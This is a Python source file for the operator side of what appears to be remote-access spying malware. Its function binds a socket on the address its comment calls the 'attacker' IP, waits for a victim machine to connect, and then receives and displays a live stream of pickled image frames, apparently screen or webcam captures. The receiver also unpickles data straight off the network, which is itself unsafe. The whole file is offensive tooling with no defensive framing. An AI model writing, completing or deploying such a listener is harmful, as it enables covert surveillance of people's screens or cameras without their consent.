import socket
import struct
import pickle
import cv2

def listener(ip, port):
    port = int(port)
    HOST = ip  # Your IP (attacker)
    PORT = port

    print(f"[*] Waiting for connection on {HOST}:{PORT}...")
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((HOST, PORT))
    server.listen(1)

    conn, addr = server.accept()
    print(f"[+] Connection received from {addr}")

    data = b""
    payload_size = struct.calcsize("Q")

    while True:
        while len(data) < payload_size:
            packet = conn.recv(4096)
            if not packet:
                break
            data += packet

        packed_msg_size = data[:payload_size]
        data = data[payload_size:]
        msg_size = struct.unpack("Q", packed_msg_size)[0]

        while len(data) < msg_size:
            data += conn.recv(4096)

        frame_data = data[:msg_size]
        data = data[msg_size:]

        frame = pickle.loads(frame_data)
        frame = cv2.imdecode(frame, cv2.IMREAD_COLOR)

        cv2.imshow(f"{addr} colt_win", frame)
        if cv2.waitKey(1) & 0xFF == ord('q'):
            break

    conn.close()
    server.close()
    cv2.destroyAllWindows()
